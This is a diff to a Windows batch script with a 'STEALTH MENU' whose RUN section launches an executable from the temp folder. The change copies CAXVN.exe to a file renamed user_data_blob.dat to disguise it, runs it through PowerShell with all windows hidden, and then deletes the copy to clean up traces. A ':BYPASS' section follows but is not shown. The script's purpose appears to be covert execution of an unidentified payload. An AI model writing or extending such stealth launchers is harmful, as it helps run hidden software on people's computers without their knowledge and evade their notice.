@@ -90,25 +90,37 @@ goto STEALTH_MENU
 
 :RUN
 cls
-echo [*] Preparing to launch CAXVN.exe...
+echo ==========================================
+echo         *** STEALTH MENU - RUN ***
+echo ------------------------------------------
+echo [*] Preparing to launch disguised EXE...
 
-set "EXE_PATH=%temp%\CAXVN.exe"
-
-if not exist "%EXE_PATH%" (
-    echo [✖] EXE not found. Please run Setup first.
+:: Ensure EXE exists
+if not exist "%temp%\CAXVN.exe" (
+    echo [✖] ERROR: EXE not found. Run setup first.
     pause
     goto STEALTH_MENU
 )
 
-echo [*] Running silently...
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
- "Start-Process -FilePath '%EXE_PATH%' -WindowStyle Hidden -Wait"
+:: Rename EXE to DAT
+set "DISGUISED_EXE=%temp%\user_data_blob.dat"
+copy /Y "%temp%\CAXVN.exe" "%DISGUISED_EXE%" >nul 2>&1
+
+echo [*] Running in background...
+
+:: Use powershell to run it without console and wait
+powershell -WindowStyle Hidden -Command "Start-Process '%DISGUISED_EXE%' -WindowStyle Hidden -Wait"
 
 echo [✓] EXE has exited. Cleaning up...
-del /f /q "%EXE_PATH%" >nul 2>&1
+
+:: Cleanup disguised copy
+del /f /q "%DISGUISED_EXE%" >nul 2>&1
+
 echo [✓] Cleanup complete.
+echo ------------------------------------------
 pause
 goto STEALTH_MENU
+
 
 
 :BYPASS
